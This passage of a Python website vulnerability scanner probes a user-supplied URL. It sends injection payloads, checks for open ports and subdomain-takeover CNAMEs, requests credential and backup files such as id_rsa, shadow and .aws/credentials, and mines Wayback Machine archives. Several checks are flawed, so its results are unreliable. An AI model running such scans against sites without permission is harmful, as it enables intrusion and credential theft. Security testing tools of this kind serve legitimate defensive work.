    "amazonaws.com", "s3.amazonaws.com", "cloudfront.net", "compute.amazonaws.com",
    "elasticbeanstalk.com", "lightsail.com", "azurewebsites.net", "azureedge.net",
    "azure-api.net", "azurecontainer.io", "cloudapp.net", "storage.googleapis.com",
    "appspot.com", "firebaseapp.com", "web.app", "run.app", "herokuapp.com",
    "vercel.app", "zeit.co", "pages.dev", "digitaloceanspaces.com",

    # Website Builders & CMS
    "github.io", "bitbucket.io", "gitlab.io", "readthedocs.io", "surge.sh",
    "netlify.com", "netlify.app", "unbouncepages.com", "instapage.com",
    "tilda.ws", "weebly.com", "strikingly.com", "bigcartel.com",
    "cargo.site", "smugmug.com", "bubble.io", "ghost.io",

    # E-commerce Platforms
    "shopify.com", "myshopify.com", "bigcommerce.com", "squarespace.com",
    "webflow.io", "storenvy.com", "sellfy.store", "ecwid.com", "wixsite.com",

    # Hosting Providers
    "pantheon.io", "fly.dev", "glitch.me", "render.com", "cloud66.com",
    "platform.sh", "kinsta.cloud", "wpengine.com", "pressable.com",
    "pressidium.com", "pagely.net", "fastly.net", "swarmcdn.com",

    # CDNs & Proxy Services
    "cdn.cloudflare.net", "stackpathcdn.com", "limelight.com", "akamaihd.net",
    "maxcdn.com", "cdn77.com", "b-cdn.net", "fastlylb.net",

    # SaaS & API Providers
    "zendesk.com", "helpscoutdocs.com", "statuspage.io", "datadoghq.com",
    "segment.io", "mixpanel.com", "launchdarkly.com", "intercom.io",
    "uservoice.com", "freshdesk.com", "getresponse.com", "mailchimp.com",

    # Map & Location Services
    "mapbox.com", "here.com", "arcgis.com", "opencagedata.com", "tomtom.com",

    # Customer Support & Chat
    "tawk.to", "olark.com", "livechat.com", "purechat.com", "chatra.io",

    # Media Hosting
    "cloudinary.com", "imgix.net", "filepicker.io", "storyblok.com",
    "filestackapi.com", "wistia.com", "vimeo.com", "brightcove.com",

    # Analytics & Tag Managers
    "segment.com", "googletagmanager.com", "matomo.cloud", "statcounter.com",
    "hotjar.com", "crazyegg.com", "kissmetrics.io",

    # CI/CD & DevOps Platforms
    "circleci.com", "travis-ci.com", "semaphoreci.com", "gitpod.io",
    "codesandbox.io", "codepen.io", "jsfiddle.net", "replit.com",
    
    # Documentation Platforms
    "confluence.com", "readme.io", "gitbook.io", "slite.com", "notion.site",
    
    # Ad Networks & Affiliate Marketing
    "outbrain.com", "taboola.com", "revcontent.com", "mgid.com",
    
    # AI & Machine Learning Services
    "openai.com", "huggingface.co", "assemblyai.com", "deepgram.com",
    
    # Miscellaneous Platforms
    "carrd.co", "disqus.com", "typeform.com", "formstack.com",
    "wufoo.com", "jotform.com", "formsite.com", "123formbuilder.com",
    "paperform.co", "cognitoforms.com", "rechargeapps.com"
]

SENSITIVE_FILES = {
    "config": [".env", "config.json", "config.yaml", "config.xml", "settings.ini", "web.config", "local.settings.json", "parameters.yml", "appsettings.json", "connections.config", "credentials.xml", "secrets.env"],
    "database": ["database.sql", "dump.sql", "backup.db", "users.db", "mysql_backup.sql", "db_backup.sql", "postgresql_backup.tar", "mongo_backup.bson", "redis.rdb", "cassandra_backup.cql", "mssql_backup.bak"],
    "logs": ["error.log", "debug.log", "access.log", "server.log", "system.log", "application.log", "history.log", "auth.log", "audit.log", "transaction.log", "backup.log", "security.log"],
    "source_code": [".git", ".svn", "package-lock.json", "composer.lock", "yarn.lock", ".hg", ".bzr", "node_modules.zip", "source_code.tar", "repository_backup.zip", "src_backup.tar.gz"],
    "documents": [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", "financials.xlsx", "credentials.docx", "HR_records.xlsx", "client_data.csv", "confidential.pdf", "legal_contract.docx"],
    "archives": [".zip", ".tar", ".tar.gz", ".tgz", ".rar", ".7z", ".bak", "backup.zip", "archive.tar", "old_version.7z", "compressed_backup.tar.gz", "database_archive.rar", "logs_backup.7z"],
    "credentials": ["id_rsa", "id_rsa.pub", "passwd", "shadow", "auth.json", "private.pem", "secrets.txt", "passwords.csv", "user_credentials.json", "ssh_keys.txt", "htpasswd", "htpasswd.bak"],
    "api_keys": ["api_key.txt", "tokens.json", "aws_credentials.ini", "secrets.json", "google_api.json", "slack_token.json", "firebase_keys.json", "stripe_keys.json", "github_token.env", "bitbucket_secrets.yaml"],
    "misc": ["phpinfo.php", "test.php", "debug.php", "backup.tar.gz", "old_version.zip", "staging.json", "dev_secrets.json", "wordpress_backup.sql", "deprecated_config.yaml", "old_admin.json", "test_credentials.txt"],
    "cloud_storage": [".aws/credentials", ".gcloud/config.json", "azure_storage_keys.json", "s3_backup.tar", "cloud_storage_backup.zip", "google_drive_backup.tar", "dropbox_sync.zip"],
    "config_backup": ["nginx.conf", "httpd.conf", "apache.conf", "server.conf", "lighttpd.conf", "kubernetes.yaml", "docker-compose.override.yml", "firewall_rules.conf", "proxy_settings.json", "load_balancer.conf"],
    "exposed_scripts": ["test.js", "admin.php", "shell.php", "upload.php", "debug.js", "backup.py", "config_backup.js", "admin_tools.sh", "database_dump.php", "cron_jobs.txt", "automation_scripts.py"],
    "emails": ["customer_emails.csv", "internal_contacts.xlsx", "email_list.txt", "mailing_list.json"],
    "financial": ["transactions.csv", "payroll.xlsx", "invoice.pdf", "bank_statements.zip", "budget_planning.xlsx"],
    "legal": ["contracts.docx", "nda.pdf", "terms_of_service.html", "privacy_policy.txt", "lawsuit_documents.zip"]
}

# =====================================================
# ============== Setting up main FUNCTIONS ============
# =====================================================



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


randomInt = random.randint(0, 9999)


LOG_FILE = f"scan_results_{datetime.now().strftime('%m%d_%S')}_{randomInt}.txt"


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def set_console_title(title):
    if os.name == "nt":
        os.system(f"title {title}")
    elif sys.platform == "darwin":  
        os.system(f'echo "\033]0;{title}\007"')
    elif sys.platform.startswith("linux"): 
        sys.stdout.write(f"\x1b]2;{title}\x07")
        sys.stdout.flush()


def log_result(message):
    print(message)
    with open(LOG_FILE, "a") as log_file:
        log_file.write(message + "\n")


def scan_for_sql_injection(url):
    results = []
    for payload in SQLI_PAYLOADS:
        test_url = url + payload
        response = requests.get(test_url, verify=False)
        if "mysql" in response.text.lower() or "syntax error" in response.text.lower():
            results.append(f"SQL Injection vulnerability found: {test_url}")
    return results if results else ["No SQL Injection vulnerabilities detected"]


def scan_for_xss(url):
    results = []
    for payload in XSS_PAYLOADS:
        test_url = url + payload
        response = requests.get(test_url, verify=False)
        if payload in response.text:
            results.append(f"XSS vulnerability found: {test_url}")
    return results if results else ["No XSS vulnerabilities detected"]


def check_security_headers(url):
    response = requests.get(url, verify=False)
    for header in HEADERS.keys():
        if header in response.headers:
            HEADERS[header] = response.headers[header]
    
    return HEADERS


def scan_common_dirs(url):
    results = []
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(requests.get, f"{url}{directory}", verify=False): directory for directory in COMMON_DIRS}
        for future in concurrent.futures.as_completed(futures):
            directory = futures[future]
            try:
                response = future.result()
                if response.status_code == 200:
                    results.append(f"Found accessible directory: {url}{directory}")
            except requests.RequestException:
                pass
    return results if results else ["No common directories found"]


def check_outdated_server(url):
    response = requests.get(url, verify=False)
    server_header = response.headers.get("Server", "Unknown")
    for server in OUTDATED_SERVERS:
        if server.lower() in server_header.lower():
            return f"Potential outdated server detected: {server_header}"
    
    return f"Server seems up to date: {server_header}"


def scan_open_ports(target):
    open_ports = []
    for port, description in UNSAFE_PORTS.items():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                open_ports.append(f"Port {port} is open ({description})")
    return open_ports if open_ports else ["No open ports detected"]


def scan_for_hardcoded_secrets(url):
    results = []

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(requests.get, f"{url}{file}", verify=False): file for file in COMMON_FILES}

        for future in concurrent.futures.as_completed(futures):
            file = futures[future]
            try:
                response = future.result()
                if response.status_code == 200:
                    content = response.text

                    for pattern in SENSITIVE_PATTERNS:
                        if re.search(pattern, content):
                            results.append(f"Potential secret found in: {url}{file}")
                            break

                    if file.endswith(".html"):
                        soup = BeautifulSoup(content, "html.parser")
                        scripts = soup.find_all("script")
                        for script in scripts:
                            if script.string:  
                                for pattern in SENSITIVE_PATTERNS:
                                    if re.search(pattern, script.string):
                                        results.append(f"Potential secret in inline script: {url}{file}")
                                        break
            except requests.RequestException:
                pass 

    return results if results else ["No hardcoded secrets found"]


def scan_dns_security(domain):
    results = []
    try:
        for record in COMMON_DNS_MISCONFIGURATIONS:
            try:
                answers = dns.resolver.resolve(domain, record)
                for answer in answers:
                    cname = str(answer)  

                    if record == "CNAME" and any(provider in cname for provider in DNS_SUBS):
                        results.append(f"Potential subdomain takeover risk: {domain} -> {cname}")

                    results.append(f"Found {record} record: {answer}")
            except dns.exception.DNSException:
                continue  
    except Exception as e:
        results.append(f"DNS scanning failed: {str(e)}")

    return results if results else ["No DNS misconfigurations found"]


def scan_open_smtp_relay(domain):
    results = []
    try:
        mx_records = dns.resolver.resolve(domain, "MX")
        for mx in mx_records:
            smtp_server = str(mx.exchange)
            try:
                with socket.create_connection((smtp_server, 25), timeout=5) as sock:
                    banner = sock.recv(1024).decode(errors='ignore')
                    if "220" in banner:
                        results.append(f"Potential open SMTP relay detected: {smtp_server}")
            except Exception:
                pass
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout):
        pass
    
    return results if results else ["No open SMTP relays found"]


def scan_firewall_misconfig(domain):
    results = []
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(socket.create_connection, (domain, port), 2): port for port in UNSAFE_PORTS}
        for future in concurrent.futures.as_completed(futures):
            port = futures[future]
            try:
                future.result()
                results.append(f"Open port detected: {port} (Potential misconfigured firewall rule)")
            except Exception:
                pass
    
    return results if results else ["No misconfigured firewall rules found"]


def scan_internal_apis(url):
    results = []
    internal_endpoints = COMMON_DIRS
    
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = {executor.submit(requests.get, f"{url}/{endpoint}", timeout=5, verify=False): endpoint for endpoint in internal_endpoints}
        for future in concurrent.futures.as_completed(futures):
            endpoint = futures[future]
            try:
                response = future.result()
                if response.status_code == 200:
                    results.append(f"Unprotected internal API found: {url}{endpoint}")
            except requests.RequestException:
                pass
    
    return results if results else ["No unprotected internal APIs found"]


import requests

import requests

def scan_wayback_for_sensitive_files(domain):
    results = []
    try:
        wayback_url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&collapse=urlkey&output=text&fl=original"
        response = requests.get(wayback_url, timeout=120)
        
        if response.status_code == 200:
            urls = response.text.splitlines()
            safe_domain = domain.replace("https://", "").replace("http://", "").replace("/", "").replace(":", "")
            with open(f"{safe_domain}.txt", "w") as file:
                file.write("\n".join(urls))
            
            for url in urls:
                for category, extensions in SENSITIVE_FILES.items():
                    if any(ext in url.lower() for ext in extensions):
                        results.append(f"Potential sensitive file found [{category}]: {url}")
        else:
            results.append("Failed to retrieve Wayback Machine data")
    except Exception as e:
        results.append(f"Error scanning Wayback Machine: {str(e)}")

    return results if results else ["No sensitive files found in Wayback Machine archives"]


def get_valid_url(url):
    url = url.strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        https_url = "https://" + url
        try:
            response = requests.get(https_url, timeout=5)
            if response.status_code < 400:
                url = https_url
            else:
                url = "http://" + url
        except requests.RequestException:
            url = "http://" + url
    
    if not url.endswith("/"):
        url += "/"
    
    return url



# =====================================================
# ============== Setting up main SOFTWARE =============
# =====================================================



def main():
    clear_console()
    url = input("Enter the URL to scan (e.g., example.com): ")
    url = get_valid_url(url)
    hostname = url.replace("https://", "").replace("http://", "").split("/")[0] 

    clear_console()                                                                 # [+] Clearing console for clean look

    set_console_title(f"[+] Scanning URL: {url}. Made by Stijn, use for educational purposes only.")

    log_result(f"[+] Scanning URL: {url}\n")                                        # [+] Printing + Logging which URL is being scanned

    print("  [+] NOTE: Speed of the software depends on the websites speed!\n       [+] Made by Stijn, use for educational purposes only.")

    log_result("\n[+] Scanning for SQL Injection vulnerabilities...")               # [+] Step 1, SQL Injections.
    for issue in scan_for_sql_injection(url):
        log_result(f"  {issue}")

    log_result("\n[+] Scanning for XSS vulnerabilities...")                         # [+] Step 2, XSS Injections.
    for issue in scan_for_xss(url):
        log_result(f"  {issue}")

    log_result("\n[+] Scanning for header issues...")                               # [+] Step 3, Header issues.
    headers_report = check_security_headers(url)  
    for key, value in headers_report.items():
        if "Missing" in value or "Should" in value or "Deprecated" in value:
            log_result(f"  {key}: {value}")

    log_result("\n[+] Scanning for outdated servers...")                            # [+] Step 4, Looking for outdated servers.
    log_result(f"  {check_outdated_server(url)}")

    log_result("\n[+] Scanning for DNS & Network Security issues...")               # [+] Step 5, Scanning for dns, open smtp relays, missing firewalls configs
    for issue in scan_dns_security(url):                                            
        log_result(f"  {issue}")
    for issue in scan_open_smtp_relay(url):
        log_result(f"  {issue}")
    for issue in scan_firewall_misconfig(url):
        log_result(f"  {issue}")
    for issue in scan_internal_apis(url):
        log_result(f"  {issue}")

    log_result("\n[+] Scanning for hardcoded secrets in JavaScript & HTML files...")# [+] Step 6, Scanning for hardcoded secrets.
    for issue in scan_for_hardcoded_secrets(url):
        log_result(f"  {issue}")

    log_result("\n[+] Scanning for common hidden directories...")                   # [+] Step 7, Looking for private directories, like /admin.
    for issue in scan_common_dirs(url):
        log_result(f"  {issue}")
    
    log_result("\n[+] Scanning for open ports...")                                  # [+] Step 8, Scanning for open ports.
    print("    - Please note this can take up to 2 minutes max.")
    for issue in scan_open_ports(hostname):
        log_result(f"  {issue}")

    log_result("\n[+] Scanning Wayback Machine for sensitive files...")             # [+] Step 9, Scanning wayback machine.
    print("    - Please note this can take up to 2 minutes max.")
    for issue in scan_wayback_for_sensitive_files(url):
        log_result(f"  {issue}")

    
    print("\nScan complete! Results saved in " + LOG_FILE)                          # [+] Step 10, Logging everything final.

if __name__ == "__main__":
    main()